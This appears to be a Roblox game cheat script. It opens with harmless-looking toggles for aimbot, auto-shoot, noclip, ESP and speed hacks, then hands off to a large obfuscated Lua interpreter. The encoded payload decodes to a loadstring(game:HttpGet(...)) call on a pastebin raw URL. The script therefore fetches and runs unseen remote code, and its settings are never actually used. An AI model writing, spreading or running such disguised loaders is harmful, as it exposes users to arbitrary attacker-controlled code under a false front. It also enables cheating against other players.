-- Enable this to whitelist specific players (they won’t be affected by autoshoot and aimbot)
local WHITELIST = {
    "Friend1",  -- Input the name of a friend to whitelist
    "Friend2"   -- Add more names as needed
}

-- Enable this to turn on the aimbot feature
local AimbotEnabled = false  

-- Enable this to allow toggling the aimbot on/off manually
local AimbotToggleEnabled = false  

-- Enable this to make the game automatically shoot when detecting an enemy
local AutoShootEnabled = false  

-- Choose this sensitivity value to adjust aiming speed
local BASE_SENSITIVITY = 0.5  

-- Enable this to allow infinite jumping
local InfiniteJumpEnabled = false  

-- Enable this to modify walk speed
local WalkSpeedEnabled = false  

-- Input this value to set the default walking speed
local DefaultWalkSpeed = 16  

-- Enable this to walk through walls (noclip mode)
local NoClipEnabled = false  

-- Enable this to activate ESP (Extra Sensory Perception, like wallhacks)
local ESPEnabled = false  




local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v100=0;local v101;while true do if (v100==1) then return v101;end if (v100==0) then v101=v5(v83,v19);v19=nil;v100=1;end end else return v83;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v84=0 -0 ;local v85;while true do if (v84==0) then v85=(v31/(((5 + 0) -3)^(v32-(1 -0))))%((4 -2)^(((v33-1) -(v32-((883 -263) -(555 + 64)))) + 1)) ;return v85-(v85%(932 -(857 + 74))) ;end end else local v86=568 -(367 + 201) ;local v87;while true do if (v86==(927 -(214 + 713))) then v87=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v87 + v87))>=v87) and (878 -((1347 -(68 + 997)) + 595))) or (1637 -(1523 + 114)) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0;local v36;local v37;while true do if (v35==(1270 -(226 + 1044))) then v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (8 -6) ;v35=118 -(32 + 85) ;end if (v35==(1 + 0)) then return (v37 * (57 + (1156 -(892 + 65)))) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + (6 -2) ;return (v41 * (30800116 -14022900)) + (v40 * (65886 -(87 + 263))) + (v39 * (436 -(50 + 17 + 113))) + v38 ;end local function v24() local v42=0;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(4 -2)) then v47=v20(v44,66 -45 ,23 + 8 );v48=((v20(v44,32)==(1 -0)) and  -(439 -(145 + 293))) or 1 ;v42=11 -8 ;end if (v42==(952 -(802 + 150))) then v43=v23();v44=v23();v42=2 -1 ;end if (v42==(5 -(1 + 1))) then if (v47==(0 + 0)) then if (v46==0) then return v48 * (1138 -(116 + 1022)) ;else v47=(3435 -2437) -(915 + 82) ;v45=0 -0 ;end elseif (v47==((9219 -(760 + 987)) -5425)) then return ((v46==(0 + 0)) and (v48 * ((1 -0)/(1187 -(1069 + 118))))) or (v48 * NaN) ;end return v8(v48,v47-((4233 -(1789 + 124)) -1297) ) * (v45 + (v46/((3 -1)^(10 + (808 -(745 + 21)))))) ;end if (v42==((1 + 0) -0)) then v45=1 + 0 ;v46=(v20(v44,792 -(368 + 423) ,62 -42 ) * ((20 -(10 + 8))^(122 -90))) + v43 ;v42=9 -7 ;end end end local function v25(v49) local v50=0 -0 ;local v51;local v52;while true do if (v50==((0 -0) -0)) then v51=nil;if  not v49 then v49=v23();if (v49==((1413 -(447 + 966)) + 0)) then return "";end end v50=1;end if (v50==2) then v52={};for v91=1, #v51 do v52[v91]=v2(v1(v3(v51,v91,v91)));end v50=3 + 0 ;end if (v50==(1058 -(87 + 968))) then return v6(v52);end if (v50==(4 -3)) then v51=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;v50=2;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v67=(function() return 0 + 0 ;end)();while true do if (v67~=(0 + 0)) then else if (v53==1) then local v97=(function() return 121 -(17 + 104) ;end)();while true do if (v97~=1) then else v60=(function() return {};end)();for v123= #"/",v59 do local v124=(function() return 0;end)();local v125=(function() return;end)();local v126=(function() return;end)();local v127=(function() return;end)();while true do if (v124==1) then v127=(function() return nil;end)();while true do if (v125~=(0 -0)) then else local v183=(function() return 0 + 0 ;end)();while true do if (v183~=0) then else v126=(function() return v21();end)();v127=(function() return nil;end)();v183=(function() return 1 + 0 ;end)();end if (v183==1) then v125=(function() return 1 -0 ;end)();break;end end end if (v125~=(1 -0)) then else if (v126== #"}") then v127=(function() return v21()~=0 ;end)();elseif (v126==2) then v127=(function() return v24();end)();elseif (v126~= #"-19") then else v127=(function() return v25();end)();end v60[v123]=(function() return v127;end)();break;end end break;end if (v124~=0) then else v125=(function() return 0 + 0 ;end)();v126=(function() return nil;end)();v124=(function() return 1;end)();end end end v97=(function() return 2;end)();end if (v97==(1638 -(1373 + 263))) then v53=(function() return 2;end)();break;end if (v97~=0) then else v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v97=(function() return 1 + 0 ;end)();end end end if (v53~=(2 -0)) then else v58[ #"gha"]=(function() return v21();end)();for v102= #" ",v23() do local v103=(function() return 0;end)();local v104=(function() return;end)();while true do if (v103~=(0 -0)) then else v104=(function() return v21();end)();if (v20(v104, #">", #"[")==0) then local v169=(function() return 1384 -(746 + 638) ;end)();local v170=(function() return;end)();local v171=(function() return;end)();local v172=(function() return;end)();while true do if (v169==(1 + 1)) then if (v20(v171, #".", #"/")== #">") then v172[2 -0 ]=(function() return v60[v172[343 -(218 + 123) ]];end)();end if (v20(v171,2,1583 -(1535 + 46) )~= #":") then else v172[ #"gha"]=(function() return v60[v172[ #"gha"]];end)();end v169=(function() return 3;end)();end if ((3 + 0)~=v169) then else if (v20(v171, #"nil", #"91(")~= #".") then else v172[ #"asd1"]=(function() return v60[v172[ #"0313"]];end)();end v55[v102]=(function() return v172;end)();break;end if (v169==(1 + 0)) then local v179=(function() return 560 -(306 + 254) ;end)();while true do if (0==v179) then v172=(function() return {v22(),v22(),nil,nil};end)();if (v170==(0 + 0)) then local v189=(function() return 0 -0 ;end)();local v190=(function() return;end)();while true do if (v189==(1467 -(899 + 568))) then v190=(function() return 0;end)();while true do if (v190==(0 + 0)) then v172[ #"91("]=(function() return v22();end)();v172[ #"asd1"]=(function() return v22();end)();break;end end break;end end elseif (v170== #" ") then v172[ #"91("]=(function() return v23();end)();elseif (v170==2) then v172[ #"-19"]=(function() return v23() -((4 -2)^(619 -(268 + 335))) ;end)();elseif (v170~= #"gha") then else local v195=(function() return 0;end)();while true do if (v195==(290 -(60 + 230))) then v172[ #"xxx"]=(function() return v23() -(2^(588 -(426 + 146))) ;end)();v172[ #"xnxx"]=(function() return v22();end)();break;end end end v179=(function() return 1;end)();end if (v179==(1 + 0)) then v169=(function() return 1458 -(282 + 1174) ;end)();break;end end end if (v169~=(811 -(569 + 242))) then else local v180=(function() return 0 -0 ;end)();while true do if (v180==1) then v169=(function() return 1;end)();break;end if (v180==(0 + 0)) then v170=(function() return v20(v104,1026 -(706 + 318) , #"91(");end)();v171=(function() return v20(v104, #"0836",1257 -(721 + 530) );end)();v180=(function() return 1;end)();end end end end end break;end end end for v105= #".",v23() do v56,v105,v28=(function() return v54(v56,v105,v28);end)();end return v58;end v67=(function() return 1272 -(945 + 326) ;end)();end if (v67==1) then if (v53==0) then local v99=(function() return 0 -0 ;end)();while true do if (v99~=(1 + 0)) then else v56=(function() return {};end)();v57=(function() return {};end)();v99=(function() return 2;end)();end if ((702 -(271 + 429))~=v99) then else v53=(function() return 1;end)();break;end if (0==v99) then v54=(function() return function(v133,v134,v135) local v136=(function() return 0 + 0 ;end)();local v137=(function() return;end)();while true do if (v136==(1500 -(1408 + 92))) then v137=(function() return 0;end)();while true do if (v137==0) then v133[v134-#"]" ]=(function() return v135();end)();return v133,v134,v135;end end break;end end end;end)();v55=(function() return {};end)();v99=(function() return 1;end)();end end end break;end end end end local function v29(v61,v62,v63) local v64=v61[1087 -(461 + 625) ];local v65=v61[1290 -(993 + 295) ];local v66=v61[(239 -(64 + 174)) + 2 ];return function(...) local v68=v64;local v69=v65;local v70=v66;local v71=v27;local v72=1172 -(418 + 753) ;local v73= -(1 + 0);local v74={};local v75={...};local v76=v12("#",...) -(1 + 0) ;local v77={};local v78={};for v88=0 + 0 + 0 ,v76 do if ((1454<2491) and (v88>=v70)) then v74[v88-v70 ]=v75[v88 + (530 -(406 + 123)) ];else v78[v88]=v75[v88 + (1770 -(1749 + 20)) ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do v80=v68[v72];v81=v80[1 + 0 ];if (v81<=(1326 -(1249 + 73))) then if ((v81<=(1 + 0)) or (4157<=2803)) then if (v81==(1145 -(466 + 679))) then v78[v80[4 -2 ]]=v80[3]~=((0 -0) -0) ;else v78[v80[1902 -(106 + 1794) ]]();end elseif ((4853>=2982) and (v81<=(1 + 1))) then local v107=(336 -(144 + 192)) + 0 ;local v108;local v109;while true do if (v107==(2 -(217 -(42 + 174)))) then v78[v108 + (2 -1) ]=v109;v78[v108]=v109[v80[118 -(4 + 0 + 110) ]];break;end if (v107==0) then v108=v80[586 -(57 + 527) ];v109=v78[v80[1430 -(41 + 1386) ]];v107=1;end end elseif (v81==(106 -(17 + 86))) then do return;end else v78[v80[2 + 0 ]]=v63[v80[6 -3 ]];end elseif (v81<=(17 -(10 + 1))) then if (v81==(171 -(122 + 44))) then local v110=0;local v111;local v112;local v113;local v114;local v115;while true do if ((4134>3357) and (v110==1)) then v78[v80[2 -(0 + 0) ]]={};v72=v72 + ((1507 -(363 + 1141)) -2) ;v80=v68[v72];v78[v80[2 + 0 ]]=v63[v80[1 + 2 ]];v110=3 -1 ;end if ((v110==(73 -(30 + 35))) or (3417<2534)) then v115=v80[2 + 0 ];v78[v115]=v78[v115](v13(v78,v115 + ((2838 -(1183 + 397)) -(1043 + 214)) ,v73));v72=v72 + (3 -2) ;v80=v68[v72];v110=1221 -(323 + 889) ;end if (v110==(5 -3)) then v72=v72 + (581 -(361 + 219)) ;v80=v68[v72];v78[v80[(980 -658) -(53 + 267) ]]=v63[v80[1 + 2 + 0 ]];v72=v72 + (414 -(15 + 298 + 100)) ;v110=(2960 -(1913 + 62)) -(18 + 964) ;end if ((18 -13)==v110) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2 + 0 ]]=v80[2 + 1 ]~=(850 -(20 + 830)) ;v72=v72 + 1 + 0 ;v110=6;end if (v110==6) then v80=v68[v72];v115=v80[(81 + 47) -(116 + 10) ];v112,v113=v71(v78[v115](v13(v78,v115 + 1 + 0 ,v80[741 -((1434 -892) + 196) ])));v73=(v113 + v115) -(1 -0) ;v110=(1936 -(565 + 1368)) + 4 ;end if ((2 + 1)==v110) then v80=v68[v72];v115=v80[(3 -2) + (1662 -(1477 + 184)) ];v114=v78[v80[7 -4 ]];v78[v115 + (2 -(1 -0)) ]=v114;v110=1555 -(1126 + 425) ;end if ((v110==(412 -(118 + 287))) or (2722<=164)) then v111=0;for v173=v115,v73 do v111=v111 + 1 ;v78[v173]=v112[v111];end v72=v72 + 1 ;v80=v68[v72];v110=(29 + 2) -23 ;end if (((1986 -(564 + 292)) -(118 + 1003))==v110) then v78[v80[5 -3 ]]();v72=v72 + (378 -(142 + 235)) ;v80=v68[v72];do return;end break;end if (v110==(18 -14)) then v78[v115]=v114[v80[1 + 3 ]];v72=v72 + (978 -(553 + 424)) ;v80=v68[v72];v78[v80[2]]=v80[5 -2 ];v110=5 + (0 -0) ;end if (v110==(0 + 0)) then v111=nil;v112,v113=nil;v114=nil;v115=nil;v110=2 -1 ;end end else v78[v80[2 + 0 ]]=v80[2 + 1 ];end elseif (v81<=7) then local v118=0 + 0 ;local v119;local v120;local v121;local v122;while true do if (v118==(4 -2)) then for v176=v119,v73 do local v177=0 -0 ;while true do if (((0 -0)==v177) or (2408<2109)) then v122=v122 + 1 + 0 ;v78[v176]=v120[v122];break;end end end break;end if (v118==(0 -0)) then v119=v80[755 -(239 + 514) ];v120,v121=v71(v78[v119](v13(v78,v119 + 1 + 0 ,v80[1332 -(797 + 532) ])));v118=1 + 0 ;end if (v118==(1 + 0)) then v73=(v121 + v119) -(2 -1) ;v122=1202 -(373 + 829) ;v118=733 -(476 + 255) ;end end elseif (v81==(1138 -(369 + 761))) then local v130=v80[2];v78[v130]=v78[v130](v13(v78,v130 + 1 + 0 ,v73));else v78[v80[2 -0 ]]={};end v72=v72 + (1 -0) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F553667784D527137000A4Q00057Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000500016Q000200056Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
